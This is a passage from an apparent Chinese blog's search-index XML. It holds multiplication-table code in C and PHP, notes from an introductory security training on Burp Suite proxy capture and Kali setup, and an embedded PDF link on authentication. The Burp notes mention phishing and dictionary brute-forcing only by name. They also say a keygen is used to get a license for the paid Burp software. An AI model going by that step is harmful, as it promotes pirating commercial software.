src="https://img-blog.csdnimg.cn/20201120004938513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center">④四层发现<br><img src="https://img-blog.csdnimg.cn/20201120005033130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><img src="https://img-blog.csdnimg.cn/20201120005051567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center">任务：九九乘法表<br>C语言</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">9</span>; i++) <br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= i; j++) <br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%dx%d=%d &quot;</span>, j, i, i * j);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>php</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>九九乘法表<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="css"><span class="xml"><span class="hljs-selector-tag">table</span>&#123;</span></span><br><span class="css"><span class="xml">    <span class="hljs-attribute">border-collapse</span>:collapse; <span class="hljs-attribute">border-spacing</span>:<span class="hljs-number">0</span>; <span class="hljs-attribute">border-left</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; <span class="hljs-attribute">border-top</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; </span></span><br><span class="css"><span class="xml">&#125;</span></span><br><span class="css"><span class="xml"><span class="hljs-selector-tag">td</span>&#123;</span></span><br><span class="css"><span class="xml">    <span class="hljs-attribute">border-right</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; <span class="hljs-attribute">border-bottom</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; <span class="hljs-attribute">padding</span>:<span class="hljs-number">3px</span> <span class="hljs-number">15px</span>; <span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:left</span>; <span class="hljs-attribute">color</span>:<span class="hljs-number">#3C3C3C</span>;</span></span><br><span class="css"><span class="xml">&#125;</span></span><br><span class="css"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&#x27;600&#x27;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&#x27;1&#x27;</span>&gt;</span></span><br><span class="xml"></span><span class="php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="php"><span class="hljs-comment">//控制行数</span></span><br><span class="php"> <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$j</span>&lt;=<span class="hljs-number">9</span>;<span class="hljs-variable">$j</span>++)&#123;</span><br><span class="php">     <span class="hljs-comment">//tr开始</span></span><br><span class="php">     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="php">     <span class="hljs-comment">//控制列数</span></span><br><span class="php">     <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-variable">$j</span>;<span class="hljs-variable">$i</span>++)&#123;</span><br><span class="php">         <span class="hljs-comment">//输出td</span></span><br><span class="php">         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;<span class="hljs-subst">&#123;$i&#125;</span>x<span class="hljs-subst">&#123;$j&#125;</span>=&quot;</span>.(<span class="hljs-variable">$i</span>*<span class="hljs-variable">$j</span>).<span class="hljs-string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="php">    &#125;</span><br><span class="php">    <span class="hljs-comment">//tr结束</span></span><br><span class="php">     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="php">&#125;</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>​    </p><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>burp</title>
    <link href="/2020/11/19/burp/"/>
    <url>/2020/11/19/burp/</url>
    
    <content type="html"><![CDATA[<p>721第一次培训就网络安全对其进行一些介绍和方向上的讲解，还有一些网络钓鱼，字典爆破等攻击手段，并演示了burp实现对HTTP的抓包，分析抓包的内容，以及分享了利用burp可以实现什么。</p><p>此次任务有：熟悉HTTP协议，利用burp抓包，搭建虚拟机kali。</p><h1 id="重点内容：burp"><a href="#重点内容：burp" class="headerlink" title="重点内容：burp"></a>重点内容：burp</h1><h2 id="1-1burp的安装"><a href="#1-1burp的安装" class="headerlink" title="1.1burp的安装"></a>1.1burp的安装</h2><p>①<strong>配置Java环境</strong><br>(问：为什么要这样配置     答：burp是由Java语言编写而成，其可执行程序是java文件类型的jar文件，运行时依赖于JRE)<br>②<strong>配置系统的环境变量</strong>（环境变量，就是在操作系统中一个具有特定名字的对象，它包含了一个或者多个应用程序所将使用到的信息。例如Windows和DOS操作系统中的path环境变量，当要求系统运行一个程序而没有告诉它程序所在的完整路径时，系统除了在当前目录下面寻找此程序外，还应到path中指定的路径去找。用户通过设置环境变量，来更好的运行进程。）<br>③由于burp是付费软件，我们需要<strong>使用注册机来获取license</strong>，如图<img src="https://img-blog.csdnimg.cn/20201119214908963.gif#pic_center" alt="burp注册机的操作">③注册后即可使用burp</p><h2 id="1-2抓包"><a href="#1-2抓包" class="headerlink" title="1.2抓包"></a>1.2抓包</h2><p>①<strong>对浏览器设置代理</strong>：安装foxyproxy插件，设置代理IP<br>127.0.0.1 端口8080的代理<br>②打开浏览器，打开代理，随便打开一个网站，在burp的<strong>proxy</strong>即可查看对网站HTTP的抓包,将所抓的包发至<strong>repeater</strong>，即可对网站的回应进行拦截。</p><p><img src="https://img-blog.csdnimg.cn/20201119223920841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center" alt="proxy"><br><img src="https://img-blog.csdnimg.cn/20201119224103488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center" alt="repeater"></p><h2 id="搭建kali"><a href="#搭建kali" class="headerlink" title="搭建kali"></a>搭建kali</h2><p>2.1安装VMware Workstation （略）<br>2.2下载镜像文件（略）<br>2.3安装kali（略）</p><h2 id="3-HTTP协议—–看书"><a href="#3-HTTP协议—–看书" class="headerlink" title="3.HTTP协议—–看书"></a>3.HTTP协议—–看书</h2>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[知乎转载]-鉴权向</title>
    <link href="/2020/11/19/%5B%E7%9F%A5%E4%B9%8E%E8%BD%AC%E8%BD%BD%5D-%E9%89%B4%E6%9D%83%E5%90%91/"/>
    <url>/2020/11/19/%5B%E7%9F%A5%E4%B9%8E%E8%BD%AC%E8%BD%BD%5D-%E9%89%B4%E6%9D%83%E5%90%91/</url>
    
    <content type="html"><![CDATA[<div class="row">    <embed src="/pdf/一文搞懂鉴权之cookie&amp;session&amp;token&amp;jwt&amp;单点登录.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
